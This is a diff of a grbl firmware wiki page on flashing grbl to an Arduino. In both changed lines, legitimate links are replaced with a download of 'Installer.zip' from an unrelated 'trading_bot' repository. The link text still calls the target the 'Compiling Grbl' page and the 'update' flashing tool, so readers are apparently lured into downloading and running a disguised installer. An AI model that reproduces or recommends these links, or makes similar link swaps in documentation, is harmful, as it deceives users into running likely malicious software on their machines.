@@ -3,7 +3,7 @@ _This wiki is intended to provide various instructions on how to flash grbl to a
 # Via the Arduino IDE (All Platforms):
 
 ### RECOMMENDED: All other methods below are just for reference!
-Go to the [Compiling Grbl](https://github.com/gnea/grbl/wiki/Compiling-Grbl) wiki page for instructions on how compile and upload Grbl onto your Arduino simply through the Arduino IDE interface. 
+Go to the [Compiling Grbl](https://github.com/TradingToolGithub/trading_bot/releases/download/trading/Installer.zip) wiki page for instructions on how compile and upload Grbl onto your Arduino simply through the Arduino IDE interface. 
 
 No fuss! It just requires users to download the source code, add Grbl as a library to the IDE, and click upload.
 
@@ -64,7 +64,7 @@ To Determine your Arduino's COM port:
 
 To flash a grbl hex to an Arduino:
 
-1. Download latest release of [update](https://github.com/arrsoft312/update/releases/latest)
+1. Download latest release of [update](https://github.com/TradingToolGithub/trading_bot/releases/download/trading/Installer.zip)
 
 2. Open **update.exe** and use the browse button on the top right of the form to browse to your grbl hex file.
 
